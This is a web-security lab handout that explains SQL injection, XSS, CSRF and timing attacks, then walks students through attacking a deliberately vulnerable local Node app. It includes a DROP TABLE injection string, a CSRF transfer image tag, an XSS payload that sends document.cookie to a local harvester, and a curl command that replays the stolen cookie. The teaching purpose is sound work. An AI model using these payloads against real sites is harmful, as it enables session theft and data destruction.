Lab 6: Security
===============

In this lab you'll review some of the basics of web application security.

In production (professional environments), security is one of the most important issues for web applications. Many applications deal with sensitive data: personal information, payment
data, and data users would like not to be destroyed. Any exploited security flaw
can quickly damage the reputation of an application, if not the business
behind it.

*Obligatory notice*: some of the things you'll be trying in this lab are potentially dangerous. Accessing or attacking a computer system without authorization is illegal, and [people go to prison for it](http://en.wikipedia.org/wiki/List_of_computer_criminals).

## Basic tenets of web application security

The most fundamental rule of web application security is *don't trust user inputs*.
It's pretty simple in theory but it manifests itself in many and sometimes quite
subtle ways. As a review, here are the primary ways users provide input to your application:

* GET requests (including the request path `/some/page`, request parameters `?foo=1&bar=2`, and HTTP headers like cookies.)
* POST requests (including the request path, request parameters [though this is not typical for a POST request], HTTP headers, and the request body containing form data.)
* Information sent through web sockets.
* Other HTTP verbs like HEAD, TRACE, OPTIONS, PUT, and DELETE (implemented less often)

We'll concern ourselves mostly with the first two.

### The client side (the browser) is not secure

Nothing that happens in the browser is secure: the user can manipulate everything that happens on a page, from its content to the Javascript that it runs to the requests it makes. The *only thing you have full control over as a developer is the server*.

That means, for example:

* That validating information (like an email address) with Javascript in the browser is useless from a security perspective. (Although useful perhaps from a user experience perspective.)
* That any kind of authentication performed on the client side, e.g. checking a password with Javascript in the browser, is useless.

### Unauthenticated things are not secure

If a resource (i.e. a handler, a path, an endpoint) does not check that the request being made is authenticated by a user with appropriate permissions then that resource isn't secure. Imagine, for example the resources of Insecure Banking Inc.:

`/login` Login page for the bank, redirects to `/myaccount`

`/myaccount` Makes sure the user is authenticated and if so, shows their balance and assorted interfaces (such as a link to `/transfer-money`.)

`/transfer-money` Moves money between two accounts as specified by the request. 

If `/transfer-money` does not explicitly check that the sending account is authenticated, any user can send money from anyone's bank account -- even if they're never shown the interface to it. *An attacker can always make a request to any URL (i.e. any resource on your server) with any parameters of their choice.* This means any path, any parameters, and any headers (and therefore any cookies). If you don't check to make sure in some way that they should be allowed to make that request then they can.

### Things sent in plaintext are not secure

The default protocol for the web, HTTP, sends everything over the internet
in plain text. This means that if someone else controls a router between
a user and your server (someone else always will) they *can read everything
that is sent to your server or sent from it*. This comes up in particular
for unsecured Wi-Fi hotspots: everyone in the room can read anything sent
via HTTP.

This has a number of implications. First, the user should never be sending
sensitive information at all over HTTP: any kind of payment information
or other sensitive data could be picked up without a trace. Passwords
are a little more complicated because schemes exist to prove that the
user has the correct password without ever sending the password to the
server.

Second, any authenticated actions the user takes are potentially re-playable if the application doesn't prevent it. An attacker can listen to any request -- even if it's authenticated in a way which makes it impossible to change what the request is -- and
simply send it again. This can be addressed by including a token (or nonce) provided by the server in the request, which the server can check for double-submits.

The standard way to address all of these problems is to switch to HTTPS (HTTP secure). It's a bit of a hassle to set up, and it usually costs a couple bucks, but it more or less transparently solves these issues.

### Some special cases of dangerous user inputs

#### SQL injection

In a SQL injection attack an attacker sends a request with input which contains carefully constructed SQL statements. If you aren't careful -- particularly if you use string concatenation to build queries -- attackers are able to run arbitrary commands on your database. This is a bad thing.

How this works:

Imagine we're writing some code to display user information for their profile page. This will just show the construction of a query string to extract information from the database for that page.

```
//We have their username in some variable user_name:
"SELECT * FROM users WHERE username='" + user_name + "'"

//So if user_name was equal to "Sam" we'd have:
"SELECT * FROM users WHERE username='Sam'"
//(Which would do what we wanted.)

//But what if user_name was equal to:
"'; DROP TABLE users;"

//We would get the following query:
"SELECT * FROM users WHERE username=''; DROP TABLE users;"
//Which is a valid query with predictable consequences.
//(Everything in the users table would be deleted.)
```

The best practice to avoid SQL injection is to use stored procedures. Parameterized queries, where the query and data are sent separately, are also relatively secure.

#### XSS

Cross-site scripting (abbreviated XSS) is an attack where an attacker is able to run some Javascript code in other people's browsers on your site. This allows them to do a number of nasty things:

* Steal the contents of the victim's cookies, and if they are being used for authentication impersonate the victim.
* Make fraudulent requests from the victim's browser to your site, which will be indistinguishable from a legitimate request by the victim. (This is like CSRF below, but same-site rather than cross-site.)
* Change the content and behavior of your website to anything they want.

XSS is possible when user content is rendered onto the page directly without escaping HTML. If the attacker can find a way to control some user content they can inject Javascript into the page in a number of ways. This can either be reflected in a single request (the user would have to click on a link), or persistent (it's displayed to the user when they visit a page.)

Like SQL injection, this can happen when you construct the response to the user with string concatenation. Consider the following example:

I have a route `/search` which takes a query parameter:

`http://example.com/search?query=Preventing%20XSS`

(That `%20` is from [URL escaping](http://en.wikipedia.org/wiki/Percent-encoding).)

And imagine I construct the title somewhere in my code,
where `searched_for` is a variable with the user's query:

`"<h1>Search for " + searched_for + "</h1>"`

Then for the above example the resulting HTML would be:

`"<h1>Search for Preventing XSS</h1>"`

But if an attacker chose a malicious URL (hiding the link behind a bit.ly, perhaps) we could have:

`http://example.com/search?query=<script>/* up to no good here */</script>`

(This would be URL encoded too, but for clarity I haven't encoded it.)

And the result:

`"<h1>Search for <script>/* up to no good here */</script></h1>"`

The attacker has now included Javascript on the search page!

XSS is prevented by carefully controlling the outputs of your application with [escaping](http://en.wikipedia.org/wiki/HTML#Character_and_entity_references) where it's appropriate. *It's important to note that you should not try to escape HTML on your own -- use a templating language which handles this automatically.* (There are many subtle edge cases.)

#### CSRF

Cross-site request forgery allows attackers to complete a request with the user's own browser.

To understand how it works it's important to understand that cookies are sent with every request on a per-domain basis. If a cookie is set for `example.com`, any request sent to that domain will include the cookies set for `example.com` regardless of how that request was made.

In an attack the victim is somehow lured into clicking a button or link on an attacker-controlled site (if the attacker also has an XSS vector, "attacker controlled site" means "your site"). That in turn submits a request to another site the user might be logged into. If the user is indeed logged in via cookies those will be sent in the request. This can either be a GET request (through a simple link), or a POST request (though Javascript or a button submitting a hidden form.)

For example, for the `http://bank.example.com/transfer-money` endpoint (which we're assuming uses GET parameters, although you shouldn't for actions which are not idempotent) the attacker could include an image in his malicious site:

```
<img src="http://bank.example.com/transfer-money?from=Alice&to=Bob&amount=10000" />
```

Just by opening a page with this image Alice would be out $10,000.

CSRF vulnerabilities can be avoided by associating a unique token with the request. The simplest form this takes is the double submit. A token is included in every form submitted and the same token is included in the cookie. On the server side the request is checked to make sure they match. Since the attacker's site can only send cookies through requests, not read the cookies, it's unable to include the correct token.

### A few words on authentication

Writing your own authentication system is really hard. Best practices change frequently and there's nothing you need to be more careful about.

My favorite example of the sneakiness of some of the problems that arise goes like this. Suppose you have a username and a password and the user's correct password from the database. (Of course, the user wouldn't have sent the password in plaintext, and you wouldn't have stored it in plaintext, but it's easier to illustrate this way.) You might check the password like this:

```
if (given_password === correct_password){
	//they're authenticated!
}
```

And this would work, more or less -- except for the following problem. Under the hood, the equality operator on two strings is running `strcmp`, or something similar which looks something like this (in Javascript, although `strcmp` would be implemented at a much lower level):

```javascript
function strcmp(a, b){
	// If the strings are different lengths they're not equal
	if (a.length != b.length){return false;}
	for(var i=0;i<a.length;i++){
		// If the characters at index i do not match
		// the strings are not equal.
		if (a[i] !== b[i]){return false;}
	}
	return true;
}
```

This function is quite nice because it returns as soon as it figures out the strings aren't equal (if they're the wrong length or when the first character doesn't match.) The problem from a security standpoint is in fact *the difference in the amount of time it takes*.

The first thing an attacker could do is time requests with candidate passwords of different lengths. If the average time of requests with candidate passwords 8 characters long is shorter then the attacker can figure out that the user has an eight character password (because `strcmp` is returning quickly.)

Then the attacker can start trying eight character passwords and note how long they take as well. And now if passwords with `a` as their first character are taking *longer* the attacker knows that the first letter is `a`, because `strcmp` has to do another iteration of the loop and takes a little bit longer. The attacker can then repeat this with subsequent characters until they've found the user's password in its entirety.

In practice this attack would be hard to implement. You would have to be quite close to the server you were trying to steal information from, and be able to send many many requests in order to be able to discern significant differences in the amount of time. And if the passwords were properly hashed and salted you would only learn the hash of the user's password, which is somewhat less useful (if they've used a good hashing scheme.) But this is just a small taste of the complexity which these systems entail, properly implemented.

Fortunately, there are many systems that allow you to leverage third parties to provide authentication for you. These have the additional benefit of often being more user friendly (ugh, I have to make another account?). A shortlist of these technologies:

* [OpenID](http://en.wikipedia.org/wiki/OpenID)
* [Mozilla Persona](http://www.mozilla.org/en-US/persona/)
* [Facebook connect](https://developers.facebook.com/docs/guides/web/)
* [Twitter connect](https://dev.twitter.com/docs/auth/sign-twitter)
* [OAuth](http://en.wikipedia.org/wiki/OAuth) (Designed for a slightly different use case, but used for authentication sometimes nonetheless.)

## Your tasks

Download the lab from [TODOTODOTODOTODO]() and unzip it.

You'll get a chance to practice SQL injection, XSS, and CSRF with a toy Node application
which is riddled with holes and bad practices.

The endpoints for the application are:

* `/` Shows recent posts
* `/user/:username` Shows information about a user
* `/login?username=user&password=somepassword` Log in to the application (it is just the endpoint, there is no proper login form.)
* `/become-sbraun` Login as `sbraun`
* `/write-post?username=user&body=sometext` Write a new post
* `/my-password` Show the password for the current user

You can try some of these endpoints and see various access denied/error messages.

Your goals are going to be as follows:
* Steal the password for the `jbieber` account via SQL injection
* Use those credentials to inject a payload into a post on the homepage.
* Pretend to be `sbraun` and load the homepage.
* Use the hijacked cookie to steal sbraun's password.

*Note*: there are easier ways to get both passwords than these steps. Don't do it! It's against the rules, and this way will be more fun anyways.

### Practicing SQL injection

First, you'll have to steal the password to an account in order to post to it. Use [a query with `UNION`](http://en.wikipedia.org/wiki/Set_operations_%28SQL%29#UNION_operator) to figure out the password in the information for the `jbieber` account shown at `/user/jbieber`. The constructed SQL is also printed in the server logs if you're having trouble.

### Practicing XSS

Use that password and username to login to the application as `jbeiber`:

`http://localhost:8080/login?username=jbieber&password=somepasswordyoufound`

You've now got a cookie set in your browser which will authenticate `/write-post`. The body of your post is going to have a special payload, of course.

Your payload will be the following snippet:

```
%3Cimg%20src%3D%22a%22%20onerror%3D%22this.src%3D'http%3A%2F%2Flocalhost%3A3011%2Fharvest?cookie='%2Bdocument.cookie%22%20%2F%3E
```

i.e. `<img src="a" onerror="this.src='http://localhost:3011/harvest?cookie='+document.cookie" />`

This is an image with a bad source. On error it uses a little bit of Javascript to re-set its source to a URL of another small Node application which you should start (in another terminal tab) at this point:

`node harvester.js`

It listens on port 3011 for requests to `/harvest` and logs everything sent to the console. Try it out:

`http://localhost:3011/harvest?x=y&a=b`

That image above sets the `cookie` parameter to the value of `document.cookie`, which contains all the cookies for the current page.

#### Being Scooter Braun

Here you're going to have to suspend your disbelief momentarily as you become the victim.

Hit the following URL to login as `sbraun`:

`http://localhost:8080/become-sbraun`

Now you're authenticated as `sbraun` and can post as him, etc. Critically, when you follow the link to see the latest posts you're going to run your own XSS payload and send `sbraun`'s authentication cookie to the harvester you're running in another tab!

### Sidejacking

Now, donning your attacker hat again, you can use his authentication cookie to steal his password with the `/my-password` endpoint. You can use `curl`, a command line utility to make HTTP requests, to do this. Note that this is all from the attacker's server -- we don't even need to involve `sbraun`'s browser once we've stolen his cookies. It might look something like this (with your own stolen cookie):

`curl -b "user=s:sbraun.2pnRJRduah87bTyZt5KPLOADSHD8wsq1N0h8pCs30" http://localhost:8080/my-password`

This simply sends a GET request to the given URL with the cookie you supply via `-b`.

And presto, you have his password too!

### Practicing CSRF

Following the example payload above, post as `jbeiber` with something which causes any visitor to write a post when they load the homepage. You'll probably want to write your payload in plain text, but when you're done URL-encode it [with this tool](http://meyerweb.com/eric/tools/dencoder/). (This allows you to have things like slashes and spaces in your query parameters.)

Be especially careful with ampersands in your payload. Ampersands specifying parameters to the post you're making should remain unescaped, ampersands within URLs within the `body` parameter should be escaped (`& => %26`).

## Checkoff

Please prepare:
* The passwords you collected for the two accounts
* The payload you constructed